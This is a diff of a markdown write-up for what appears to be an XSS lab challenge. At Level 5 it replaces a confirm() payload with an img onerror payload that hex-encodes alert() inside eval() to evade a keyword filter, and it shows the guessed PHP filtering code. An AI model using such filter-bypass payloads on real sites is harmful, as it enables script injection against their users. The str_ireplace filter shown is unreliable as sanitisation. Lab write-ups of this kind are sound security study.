@@ -92,9 +92,9 @@ I used the details HTML tag with the ontoggle event to trigger the alert. The pa
 
 ### Level 5: 
 
-Since keywords like alert and script were filtered in Level 5, 
+Since keywords like alert and script were filtered in Level 5, I used hex escape encoding to obfuscate the alert() function, bypassing the server's keyword filters. 
 
-  - Payload: img src=x onerror="confirm('Level 5: Hacked by Mahitha Kalaga')"
+  - Payload: img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x22Level 5: Hacked by Mahitha Kalaga!\x22\x29')"
   - Code Guess: $input = $_GET["input"];
                          $input = str_ireplace(["script", "alert"], "", $input);
                          echo $input;
